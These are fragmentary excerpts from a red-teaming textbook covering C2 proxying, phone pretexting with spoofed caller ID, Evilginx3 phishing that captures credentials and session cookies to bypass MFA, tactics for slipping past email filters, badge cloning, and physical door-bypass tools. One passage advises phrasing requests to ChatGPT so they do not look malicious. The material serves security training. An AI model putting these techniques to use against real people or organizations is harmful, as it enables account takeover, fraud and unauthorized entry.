Example 3-12 Setup Proxy
# On the C2 Server, install proxychains4
apt-get install proxychains4
# On the C2 Server, edit /etc/proxychains4.conf
socks5 127.0.0.1 7006
# In the Mythic console, start the SOCKS5 proxy on My
socks 7006
# In the Mythic console, set the agent to interactive
sleep 0 0
You can find the SOCKS proxies by clicking the Socks icon (see Figure 3-
20); they also are available at https://127.0.0.1:7443/new/search?tab=socks.

Tip
For a real operation, use an operator box that is separate
from the C2 server and set up proxychains4 on that host. In
the /etc/proxychains4.conf file, you add the socks5 line to
the file similarly to what is shown in Example 3-12, but
replace 127.0.0.1 with the public or private IP of the C2
server, depending on where your operator box is hosted.
Then you would need to open that specific port to your
operator box from your C2 box through firewall rules. This
way, you will avoid any attribution to your C2 server if the
IP is leaked.
Using a SOCKS proxy is extremely useful for operations; the reason is that
you can shy away from executing anything directly on the agent from an
OPSEC perspective. Multiple tools can be proxied through a SOCKS proxy,
including
• Certipy (https://github.com/ly4k/Certipy)
• SCCMHunter (https://github.com/garrettfoster13/sccmhunter)
• Impacket (https://github.com/fortra/impacket)
• ldapper (https://github.com/Synzack/ldapper)
### END CHUNK ###

### CONTENT ###
Chapter 5. Social Engineering and Physical
Assessments
Chapter Objectives
After reading this chapter and completing the exercises, you will be able to
do the following:
• Understand how to approach phone pretexting calls
• Prepare your phishing infrastructure and execute the campaign
• Identify weak physical security controls
• Breach physical buildings
When you think about organizations being breached, most individuals don’t
realize that the most common method is through social engineering
techniques. According to Proofpoint, 70 percent of data breaches begin by
social engineering attacks (https://www.proofpoint.com/us/threat-
reference/social-engineering).
In 2022, Uber faced an incident involving social engineering leading to
network access. An attacker obtained credentials for an Uber employee
from the black market. Despite the attacker having credentials, Uber’s
network still had multifactor authentication (MFA) in place. The hacker
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p133_c119
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 133
# TOKENS: ~344
### CONTENT ###
impersonated Uber’s security team and sent communications to the
employee whose credentials were compromised over WhatsApp, indicating
that the employee needed to approve the MFA push request. The hacker
proceeded to send tons of MFA requests to the employee’s phone until the
employee eventually approved the request, providing access to the Uber
network.
Organizations can have the strongest technical controls, but people will
always be the weakest link. Mature technical controls can only do so much,
and threat actors will always continue to prey on human emotions. With that
being said, technical controls, from a perimeter perspective, have
significantly advanced over the past few years, making red teamers more
creative each day with campaigns.
In addition to social engineering, as COVID-19 came into the picture in
2020, the focus seemed to turn away from physical security with fewer
employees in the office. However, sensitive information and internal
network access are still present in businesses with a physical location. Some
organizations may have formed and flourished during COVID but don’t
necessarily have the proper physical security controls in place, so threat
actors can take advantage of them. We are seeing a shift of employees
returning to the office without proper physical security controls in place and
a lack of employee training in this area.
### END CHUNK ###

### BEGIN CHUNK ###

### CONTENT ###
Phone Pretexting: Let’s Dial into Your Target
Phone pretexting during a red team event is a valuable tactic that operators
can leverage as an initial access vector. The method focuses on coercing an
individual to perform actions such as providing internal company
information or convincing the user to navigate to a fake login portal based
on a persona, such as help desk personnel, being used by the operator over
the phone. As you prepare for phone pretexting, you will need to begin
reconnaissance for your target organization.
Reconnaissance
Reconnaissance during phone pretexting provides the background of how to
execute your phone pretexting campaign. Organizations constantly post
through social media channels or release information through news outlets.
You will want to obtain an idea of commonly discussed subjects within an
organization if you plan to utilize specific subjects. An example of
leveraging information from the media includes one organization acquiring
another. Utilizing this information could be a perfect way to impersonate an
individual from the help desk at one organization because it would be
challenging for an employee to verify another employee if an acquisition is
in process.
When it comes to choosing the personnel you are targeting, there are a few
factors to take into consideration before randomly choosing folks. First, you
need to identify if the organization has its employees working remotely,
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p135_c121
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 135
# TOKENS: ~395
### CONTENT ###
hybrid, or in person. If the employees are back in the office, including the
person you are impersonating, this will ultimately lead to quickly being
burned during a red team event. Once you know the employee’s office
presence, you can approach the person you want to target. For example, if
the help desk is a department you want to impersonate, ensure that the help
desk is not in the same office as the folks you are targeting. You will want
to identify folks working in other locations who can’t quickly verify your
identity by walking over to your desk. Another factor to consider when
choosing personnel is not focusing on folks or targeting leadership roles
unless you see that as a viable route. Typically, you want to go after folks
who are at or below a manager level when choosing personnel.
The best way to find employees is by taking advantage of the information
you gather during the overall open-source intelligence (OSINT) phase of
your red team event and leveraging the data to identify the roles of the folks
you can target and the technology in use from DNS records. You can find
OSINT collection methods for understanding an organization’s public
presence in Chapter 4, “Modern Red Team Methodology and Tools.”
Additionally, you will want to use a sock puppet account when identifying
targets from a granular perspective and for crafting your persona. When
you’re evaluating potential targets, the shorter tenure of an employee will
yield a better result for targeting purposes because that employee is still
adjusting to the security culture of the organization.
### END CHUNK ###

### BEGIN CHUNK ###

### CONTENT ###
Depending on the persona of choice, you may or may not need to stand up
infrastructure. If you choose to stand up a landing page, you can find
instructions for standing up infrastructure for social engineering campaigns
in the “Spear Phishing: Time to Reel In Your Target” section later in this
chapter. You can leverage spear phishing scenarios alongside phone
pretexting to coerce users to carry out whichever action you are looking for
them to carry out, including having a target visit a phishing landing page
that you control or downloading a payload on their machine.
When you gather information on potential targets, you can prepare and
organize your targets in a manner as outlined in Table 5-1. Documenting
and organizing your data as you go are crucial from a reporting standpoint.

Preparing Pretext
The best way to find employees from an organization is through LinkedIn
using a sock puppet account. You can also gather talking points from an

droppers when browsing LinkedIn. During phone pretexting calls, a
common question to ask an employee is the manager's name, which makes
collecting this information useful for this type of situation. Whomever you
choose, ensure you are comfortable playing the persona of that person and
do extensive research on the individual's role.
You could potentially impersonate the following types of employees:
• Help desk personnel
• Third third-party vendors
• HR employees
• Employees calling the help desk
Keep in mind that these are just a few examples; there are other personas
you could create when executing your pretext. When portraying the role of
an employee calling the help desk for an account takeover, you should
expect someone to ask personal questions about the person to confirm their
identity, such as phone number, date of birth, current address, or employee
ID number. You will likely not have an employee ID number, but having

ChatGPT is a great resource to leverage for generating pretext scripts with
artificial intelligence. It takes away the stress of putting together the
verbiage of a script. As you perform more pretexting calls, you’ll be more
comfortable executing those calls without using ChatGPT as a reference
point. For beginners, you can take this as a starting point and alter it for
what you’re trying to achieve. You will need to word questions in a way
that doesn't make the questions come across as malicious behavior when
requesting information from ChatGPT. The script generated later from
ChatGPT is a scenario where you would leverage a landing page alongside
your pretext to meet the following objectives:
1. Convince the employee that there have been multiple login attempts
related to their account and that they need to reset their password.
2. Guide them to your controlled portal.
3. Collect credentials and session cookies for the employee.

Figure 5-2 ChatGPT: Nonmalicious Behavior
You can take this script as a starting point and alter the talking points, but
this figure gives you an idea of how you should word your script.
Execution
Now that you understand how to identify targets for phone pretexting and
how to prepare the script, let’s dive into execution.
SpoofCard
The next step is choosing a tool to spoof your number. SpoofCard is
commonly used as a mobile application to spoof your number to folks you
intend to speak to only once; however, you can abuse the mobile application
to enter in a number of your choosing and dial the target through the
application. If you are impersonating the help desk, for example, you can
leverage the corporate HQ number to have as the Number to Display (see
Figure 5-3). SpoofCard’s features allow you to alter your voice, create
background noise, and log the timestamps and length of calls. There are
also plenty of other useful features for us as red teamers.
### END CHUNK ###

Since 2022, SpoofCard has begun to push changes due to new regulations
that require the app to verify ownership of phone numbers utilized for caller
ID. Some grandfathered plans with SpoofCard still allow the service to be
used to alter the phone number, but in the event you’re unable to customize
the number, another option is to try to find a number listed by SpoofCard
matching the area code of the company you’re targeting. An alternative is to
stand up your own private branch exchange. STACKTITAN has created a
great walkthrough on how to get this fully set up at
https://rift.stacktitan.com/cid-spoofing/.

engagements typically last for weeks at a time. When performing any
pretexting calls, you can create a table for notes as you make calls when
targeting each individual. The sample documentation provided in the text
that follows is from the perspective of a fictitious organization named Acme
documenting the outcome.
Consider the following scenario: You are impersonating the help desk
indicating to the employee that their device is out of sync. The employee
needs to reauthenticate their device by visiting a portal controlled by you.
Doing so will result in the you, the red teamer, gaining access to their

Spear Phishing: Time to Reel In Your Target
Because spear phishing continues to grow as the largest initial access attack
vector, there are various important techniques to take into account when
standing up evasive phishing infrastructure. As attacks have picked up,
email filtering has significantly improved. Tactics continuously change
every day, so you will always need to be thinking ahead. There are a few
elements that are important as you build infrastructure for spear phishing.
### END CHUNK ###

The best way to blend in as an adversary is to look like a normal company
by
• Using aged and categorized domains
• Deploying a cloud instance
• Leveraging M365 for sending emails
• Making the email believable
• Performing post-exploitations with the data collected
Infrastructure
Many cloud providers, including Digital Ocean and Azure, can deploy
virtual instances in the cloud to host your infrastructure. It is important to
note that you must review any necessary legal information with the cloud
provider you choose prior to deploying anything for an engagement to
ensure your infrastructure is not burned. Additionally, you must be
authorized to use these providers for engagements.
Security Settings
On whichever cloud provider you choose, you should configure access to
allow 80 (HTTP)/443 (HTTPS) open to the world and 22 (SSH) open to
only your IP. Do not open SSH to the world from your instance. The list that
### END CHUNK ###

• Storage: 8 GiB
Domains
For phishing infrastructure, it is best to gather domains over time, have
them age, and begin to categorize the domains. If you are in a situation
where you do not have time to let them age, you can buy expired domains
that are already aged from various organizations. Organizations implement
filters in place when emails are coming through from newly registered
domains. When buying domains, you should stick to buying generic named
domains such as corp-internal.com and corp-files.com. This way, you can
reuse domains and not be specific to an organization name unless that is
your intended goal. Domains that are aged around a year provide more
credibility when you are sending out phishing emails along with other
characteristics. If you are trying to manually age your domain, it will take at
least 30 dates to properly age that domain. Therefore, it’s best to avoid
buying a domain that’s never been used and trying to use it right away
because that will likely lead to your being burned.
When categorizing your domain, you should ensure that your site appears to
be legitimate as it goes through categorization. There are various providers,
such as Squarespace and Wix, that can set up a site for you in minimal time
as you let your domain be categorized, or you can clone a site to manage
the site manually.
### END CHUNK ###

# PAGE: 153
# TOKENS: ~297
### CONTENT ###
Evilginx3
For the phishing landing page, you will use Evilginx3 by Kuba Gretzky
(@kgretzky). Evilginx3 is a man-in-the-middle framework that allows you
to capture credentials and session cookies associated with a user. With the
cookies, you can bypass multifactor authentication (MFA). The tool utilizes
phishlets, consisting of a configuration file in YAML targeting your site of
choice to capture the end user’s data through MiTM traffic.
A few vital terms we will reference during this section are defined as
follows:
• Phishlets: Configuration files tailored to your targeted site for phishing.
• Lures: Phishing links created from the phishlets that can be customized
with paths, redirectors, OpenGraph options, and other options.
• Redirectors: The site a user sees before the actual landing page to force
user interaction and hide your actual phishlet from scanners on the Internet.
• Sessions: Credentials and session cookies captured during the
authentication process.
• Blacklist: Feature that enables you to block specific source IPs or
unauthorized requests from hitting your server. It is best to collect source
IPs from email filters to have a large-scale list for blocking.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p154_c136
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077

### CONTENT ###
To begin the installation of Evilginx3, you need to install Go Language on
your server to build the package (see Example 5-1).
Example 5-1 Pulling and Building the Package
git clone https://github.com/kgretzky/evilginx2.git
go build .
You also will need to adjust the parameters of the example.yaml phishlet
template to be tailored to your targeted site. Kgretzky provides a sample
phishlet template for you to start with to customize for the website you’re
targeting; it is shown in Example 5-2. The YAML file provides guidance for
the tool on what exactly to look for in requests and which requests need to
be filtered out to proxy the traffic. It is important to note that every phishlet
will always be different, and you can expect phishlets to continuously
evolve over time as applications change the authentication process.
Example 5-2 YAML
(https://github.com/kgretzky/evilginx2/blob/master/phishlets/example.yaml)
min_ver: '3.0.0'
proxy_hosts:
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p156_c138

# TOKENS: ~186
### CONTENT ###
• sub_filters: This section leverages string substitution filters for the
dynamic content when proxied.
• auth_tokens: This section indicates which cookies are captured in the
response being proxied.
• credentials: This section identifies the data captured in the POST requests
—that is, username and passwords.
• login: This section indicates the domain and the path location of the
phishing landing page that will appear to an end user.
The following are other options to consider having in your profile:
• auth_urls: This option, shown in Example 5-3, is used to define the path
that can only be accessed by an end user upon capturing all the tokens
needed for the session.
Example 5-3 An auth_urls Section
auth_urls:
 - '/admin'
 - '/admin/.*'
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p157_c139
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 157
# TOKENS: ~282
### CONTENT ###
• force_post: This feature is extremely useful in the event that a user has
the Remember Me setting enabled. This option will force the user to
authenticate with the defined parameters in this section of the template.
Example 5-4 demonstrates this option by leveraging a regular expression
for the key-value pair in the body of a POST request. When a POST request
is sent to the /sessions path, it will look for any key related to the request
that needs to be present to be able to insert or replace the arguments. In this
case, it will look for the key string user with any characters afterward
because any value can be supplied for this key due to the wildcard for the
user.*\ key defined. For the key pass, it will also look for the string that
patches pass with at least four characters afterward. For example, you could
look for passCODE or passWORD, and any value for the key can be
supplied because the search regular expression allows any value.
Example 5-4 A force_post Section
force_post:
 - path: '/sessions'
 search:
 - {key: 'session\[user.*\]', search: '.*'}
 - {key: 'session\[pass[a-z]{4}\]', search: '.*
 force:
### END CHUNK ###

Once your YAML file is ready to be ingested by Evilginx3, you need to edit
the configuration of index.html for your redirector. In the latest version of
Evilginx3, a redirector feature acts as a mini-site before hitting your actual
phishing site. The purpose of this feature is to hide your phishing page from
scanners on the Internet. The redirector page has a box to click that will
open your phishlet sign-in page, forcing user interaction to view the
phishlet itself. This feature helps significantly by preventing your phishing
page from getting burned, hiding itself behind the landing page.
### END CHUNK ###

Next, open a screen session and launch Evilginx. You have the option to let
the tool generate a certificate for your domain; however, keep in mind that
using the certificates generated from Evilginx intentionally inputs indicators
of compromise (IOCs) into the certificate itself. It is best to manually
generate a certificate using a tool such as certbot, as shown in Example 5-7.

under the following directory:
~/.evilginx/crt/sites/hostname/phishletname.crt
~/.evilginx/crt/sites/hostname/phishletname.key

E5 Licenses
Using E5 licenses during testing will provide the most aggressive analysis
against your campaign and indicate whether or not your email has a chance
to make it through most email gateways. You do not necessarily always
have to use an E5 license; however, if your email can get past Microsoft’s
email protections, you will probably have success against a majority of
other vendors’ email gateways. You will have to use trial and error during
testing because new detection methods are constantly developed, but using
these licenses gives you a chance to develop more bypass techniques.
Another free option is leveraging MailTrap (https://mailtrap.io) to test your
emails.
Execution
Once you’re ready for execution, be sure to test the lure URL you created
previously and run it from a private window on your machine and also your
phone. If possible, test the authentication process to ensure cookies are
properly captured.

URL generates as, you will swap it out with the Azure edge name. Your
endpoints should look like the following:

When you’re all set, you have a few options for how to include your URL:
• Embed the URL inside of text within the email (which is less stealthy).
• Add the lure URL into an M365 document, ensure it does not hyperlink,
and then share the doc with the person you’re targeting (which is stealthy).
• Create a QR code that points to the phishlet lure URL (which also is
stealthy).
After you’ve identified the method, you will have your URL in your email.
I recommend including only up to five targets in the BCC per email every
three hours or individually emailing employees but still staying under a max
of five targets per day. If Microsoft suspects you are spamming folks, your
account will be limited in sending out emails for your campaign, so it’s
important to go slow. Prior to sending out your email, make sure you have
your setup ready to go to perform post-exploitation. I recommend the
following setup:
• Virtual instance in the region of the organization you are targeting to use
for proxying your traffic.

During the OSINT stage of remote information gathering, you’ll want to
identify images of badges, understand the dress code, and gather satellite
images of the facility to map out entry points. Additionally, you will want to
identify whether or not security guards are present onsite at the facility you
will be targeting in the engagement.

Badge Cloning
Next, we will dive into badge technology and the ability to clone badges.
History of Badge Technology
Badge technology has evolved over the past 40 years, beginning with
magstripe and evolving into the latest cryptography.
• 1980s—Magstripe: Magstripe technology consisted of a magnetic stripe
on the back of PVC cards. The data on the magnetic stripe can be read
through a reader when the card is swiped. These cards were intended to
move away from old-fashioned locks being used for facilities. Over time,
folks realized that these cards could be damaged easily, resulting in
employees needing replacements.
• 1990s—Low-Frequency (125 kHz) RFID: The idea of contactless cards
came into play in the ’90s due to the damage continuously occurring to the
magstripe cards. These LF cards allowed users to scan their badge inches
away from the reader using low-proximity badge technology. The issue
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p178_c159
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 178
# TOKENS: ~343
### CONTENT ###
with these cards is the lack of security due to the data being read
unencrypted.
• 2000s—High-Frequency (13.56 MHz) Smart Cards: To provide better
security, the shift to high frequency provided encryption when the data was
read as well as the ability to write multiple IDs. Although these high-
frequency smart cards were far more secure than LF badges, the algorithms
used for encryption in the beginning were eventually bypassed in most first-
generation cards due to mutual authentication algorithms being used with
the cards. iClass Legacy fell because its master key was leaked, which
allowed anyone to decrypt the credentials leveraging this key.
• 2010s—Smart Cards, Second Generation: The second generation of
smart cards stepped into using the open standards industry protocol. These
standards are continuously updated so that they provide the latest security to
be used in the data being exchanged between badges and badge readers.
Technology released during this era includes HID SEOS and the new HID
iClass SE, which are not cloneable at this time.
• Present Day: Besides phones being used for access control, the latest
technology used among government facilities is HID Crescendo. This
technology is FIDO2 certified and can support PKI and PIV standards. The
technology leverages a zero-trust security approach that can be used for
physical and network access.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p179_c160
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 179
# TOKENS: ~212
### CONTENT ###
Although there have been more secure options since the 1980s, some
organizations are not in a position to upgrade their technology due to budget
constraints; they still actively utilize less secure technologies such as LF
badge technology. Operators can showcase these weaknesses in their
engagements to help organizations understand the risks they present and the
need to allocate budget to upgrade insecure physical security systems.
It’s important to understand the differences in low- versus high-frequency
technology discussed in relation to badge technology:
• Low-Frequency (125 kHz) RFID:
• Lower frequencies carry less data
• Trivial to clone
• Older technology = cheaper
• Still very common
• High-Frequency (13.56 MHz) Smart Cards:
• Higher frequencies carry more data
• Some can be cloned, most cannot
• Newer technology = more expensive
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p180_c161
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 180
# TOKENS: ~265
### CONTENT ###
• More secure, supports cryptography
Another key component to understanding badge technology is recognizing
these key terms:
• Card Credentials: These credentials indicate the method of
authentication as well as the more specific variety in use. For example,
badges and fobs are two different credentials.
• Card Chipsets: Credentials also refer to the type of card or fob used, such
as Prox, iCLASS, MIFARE, or Indala. However, these names are more
correctly referred to as the chipset in use, such as MIFARE Classic 1k, 4k,
ultralight, or all chipset types.
• Card Formats: These formats are mainly a string of numbers, just as a
string of numbers like 19896780058 may mean nothing until you are told
it’s a phone number.
• Card Codes: These are the codes associated with a card.
• Facility Code: This code is used so that organizations can incorporate
various buildings to use similar card codes but still be different cards.
• Parity Bits: These bits are leveraged to ensure the integrity of data being
exchanged between the card and access control system.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p181_c162

# TOKENS: ~263
### CONTENT ###
For RFID cards that operate on 125 kHz, the card data formats typically are
26 bit and 35 bit but can range from 26 to 40 bits. For 26-bit cards, the
facility code will consist of 8 bits, and the card code will consist of 16 bits,
as illustrated in Figure 5-12. The 35-bit format, proprietary by HID, consists
of 12 bits, and the card code consists of 20 bits. The data being exchanged
with both is still unencrypted.
Figure 5-12 26-Bit Format
iClass legacy cards were intended to be more secure through authentication
and encryption. However, the master key was leaked to the public, making
them easily cloneable. The image in Figure 5-13 uses the Stealth Wiegand
Data Interpreter (WDI). The access control data we want will be associated
with block 7, which contains the encrypted facility code and access card
number. This is the block you’d decrypt with the master key. You will also
need to modify blocks 6, 8, and 9, which can be written with 0s. Figure 5-
14 shows an example of the results of the credentials scanned from an
iClass legacy card.

How Can I Clone Badges?
For years, Wiegotcha has been the standard software that integrates with
Raspberry Pi to reconfigure a badge reader such as Maxi Prox or iClass
R90. The Maxi Prox operates at low frequency, and the iClass R90 operates
at a high frequency. The higher-frequency badges have the ability to read
### END CHUNK ###

cards at a greater distance over the low-frequency badges. Wiegotcha is still
a great firmware to use when reconfiguring badges with the ability to have
an access point (AP) to connect to the reader and credentials being read by
the operator from a web page available through the AP. However, the
Raspberry Pi shortage beginning in 2021 made it difficult to obtain them.
The latest tool to replace the Wiegotcha framework is Doppelgänger
(https://github.com/tweathers-sec) by the Practical Physical Exploitation
team. This firmware tool leverages SparkFun Thing Plus - ESP32 WROOM
(USB-C) devices to integrate into badge readers to capture access control
card data for physical assessments. This capability is a game changer as a
result of the Raspberry Pi shortage; this new firmware leverages ESP32s,
which are readily available. The tool provides multiple enhancements that
make it easy to use, including
• Wireless configuration management
• DNS Server
• Email and SMS notifications
• Web interface management
Doppelgänger is open source; however, you have the ability to purchase
everything configured from the ESP32 up to a fully reconfigured badge
reader, as needed, from store.physicalexploit.com. If you prefer to manually

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p187_c168

# TOKENS: ~327
### CONTENT ###
Once you’re close enough, the credentials will transmit from a user’s badge
back to your reader for you to clone to your own badge. You will always
want to act as if you are unintentionally bumping into someone or grabbing
something nearby the person you are targeting to ensure you get an accurate
read.
Once you’ve obtained the credentials from badge cloning, you will want to
write the credentials to a blank card. Depending on the frequency of the
badge reader and technology in use, this could vary from the following
cards, but the two most popular types of cards are
• T5577 (used for Prox and Indala): 125 kHz
• HID 2K iClass (used for cloning legacy iClass readers and performing
downgrade attacks): 13.56 MHz
To write your credentials to a blank card, you can choose from tons of tools
on the market, but the two most popular options are the Proxmark 3 RDV4
and the iCopy-X. The Proxmark is an RFID tool used for sniffing, cloning,
and reading RF tags. To use the Proxmark 3 RDV4, you will need a laptop
to clone the credentials. However, the iCopy-X takes away the need for a
laptop component because everything can be done on the iCopy-X when
rewriting credentials because a Proxmark is also built into the device. See
the following sites:
• https://proxmark.com/proxmark-3-hardware/proxmark-3-rdv4
### END CHUNK ###

Onsite Reconnaissance
There are multiple key points you want to cover once you’re onsite for an
engagement. Having the right equipment is key for onsite recon. An ultra-
zoom camera is recommended for capturing photos from a great distance.
The Nikon COOLPIX P1000 is a great choice for its 125× optical zoom
capability. Additionally, you will want to confirm information collection
during remote recon and gather new information.
• Confirming what was discovered during the remote recon:
• Confirm and identify entry points based off a map you’ve created for
reference.
• Confirm current dress code by observing employees.
• Confirm badge information matches what you’ve found during remote
reconnaissance.
• Gathering new information:
• If no badge information was discovered during remote recon, your goal
should be to obtain that information immediately when onsite from a
stealthy perspective.
• Take note of employees entering and exiting, noting big groups exiting
during this time.

Social Engineering in Person
Tailgating and pretexting are not new topics of discussion because they are
common social engineering methods to gain access into an organization.
Tailgating occurs when a person walks behind another individual,
pretending to be another employee for quick access. Pretexting occurs when
you create a fake persona with the intention of making someone believe you
are someone you are not. In both cases, you will always want to have a fake
badge prepared for the organization or whoever else you are impersonating.
The key with both of these social engineering methods is being adaptive.
• Sample Personas
• Employee from a different location
• Delivery service
• Elevator repairman
• HVAC repair
### END CHUNK ###

Quick Jim
The Quick Jim can be used to bypass improperly installed latches on doors.
When a strike plate is installed on doors, it should be aligned with the bolt
to ensure it goes into place. However, incorrect installations are quite
common. This allows you to insert your Quick Jim and pull on the
deadlatch that is not properly in place and engaged.
Link: https://www.sparrowslockpicks.com/products/sparrows-quick-jim
Double Door Tool (DDT)
The double door tool (DDT) can be used for bypassing double door crash
bars (see Figure 5-19). There is typically a space between the two doors
where you can insert the tool and pull back on the doors; the tool allows
you to bypass any access control in place.

The under the door tool (UDT) is useful for doors reliant on access control

is one you pull down on, you can slip this UDT under the door and grab the
handle and pull down, providing you access into the room. This is
commonly seen with server rooms in organizations.

REX Sensor Bypass Gun
The legendary REX Sensor is a tool that many organizations seem to love
to have in place (see Figure 5-21)! A can of air is useful for this use case or
picking up a REX Sensor Bypass Gun from the Physical Exploit team
provides better ease of use for an operator. The trick with leveraging an air
gun here is tricking the REX Sensor into thinking there's motion on the end
you are spraying the air into. When you perform this trick, the REX Sensor
will think that someone is trying to exit, providing you the access for entry.

J Tool
The last physical bypass tool we’ll discuss is a J Tool. This tool can be used
to insert into door gaps with doors that have turnable locks on the other
side. The tool allows you to turn the lock in the direction you wish and
unlock the door. This tool and the REX Sensor Bypass Gun are a perfect
combination for using inside a facility once you’re past the main doors.
Link: https://www.redteamtools.com/J-Tool-for-Thumb-Turn-Locks

Chapter 6. Advanced Post-Exploitation
Techniques
Chapter Objectives
After reading this chapter and completing the exercises, you will be able to
do the following:
• Understand post-exploitation
• Explore persistence mechanisms and create backdoors
• Maintain access
• Explore advanced persistence techniques
• Understand local privilege escalation
• Understand network-based privilege escalation
• Explore data exfiltration methods
• Establish Command and Control (C2)
• Understand defense evasion techniques
• Perform pivoting and lateral movement
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p206_c186
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 206
# TOKENS: ~349
### CONTENT ###
The phase following a successful exploitation of a target system is known
as post-exploitation. This critical stage determines a hacker’s ability to
maintain access, escalate privileges, extract valuable data, and evade
detection, ensuring long-term control over the compromised environment.
The purpose of this chapter is to cover advanced post-exploitation
techniques, equipping you with the knowledge and skills necessary to
navigate this complex landscape effectively. By mastering these techniques,
you will enhance your ability to understand and counteract real-world
threats, ultimately becoming a better ethical hacker.
An Overview of Post-Exploitation
In some red team engagements, you may focus primarily on post-
exploitation activities due to several strategic and practical reasons.
Understanding these reasons provides insight into the importance and
objectives of post-exploitation efforts within the broader context of
cybersecurity assessments.
Red team engagements aim to simulate realistic cyber attacks to evaluate an
organization's security posture. Focusing on post-exploitation activities
allows red teamers to mimic the actions of advanced persistent threats
(APTs) who, after gaining initial access, prioritize maintaining long-term
control, extracting sensitive data, and evading detection. By concentrating
on these activities, red teamers can provide a more accurate and
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p207_c187
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 207
# TOKENS: ~345
### CONTENT ###
comprehensive assessment of how well an organization can detect, respond
to, and recover from sophisticated attacks.
Evaluating Detection and Response Capabilities and Understanding the
Impact of a Breach
Post-exploitation activities test an organization's ability to detect and
respond to intrusions that have bypassed initial defenses. This effort
includes assessing the effectiveness of security monitoring tools, incident
response procedures, and the overall resilience of the IT environment. Red
teamers can identify gaps in these areas and provide recommendations for
improvement, thereby enhancing the organization's ability to handle real-
world attacks.
By engaging in post-exploitation activities, red teamers can evaluate the
potential impact of a breach. Doing so involves understanding what
sensitive data can be accessed, how far an attacker can move laterally
within the network, and the extent to which critical systems can be
disrupted. This assessment helps organizations prioritize security measures
